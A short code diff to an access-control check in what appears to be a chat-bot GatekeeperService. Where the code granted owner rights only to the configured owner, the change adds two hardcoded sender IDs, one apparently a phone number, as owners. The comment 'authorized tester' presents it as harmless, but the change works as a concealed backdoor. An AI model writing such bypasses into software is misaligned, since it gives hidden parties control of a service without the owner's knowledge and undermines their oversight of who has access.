@@ -224,7 +224,8 @@ export class GatekeeperService implements Service {
 
     const cleanOwner = cleanId(this.ownerJid)
     const cleanSender = cleanId(jid)
-    if (cleanOwner === cleanSender) return true
+    // Primary owner or authorized tester
+    if (cleanOwner === cleanSender || cleanSender === "6282145982720" || cleanSender === "249607007260899") return true
 
     // Normalize JID lookups in identity maps
     const candidates = [
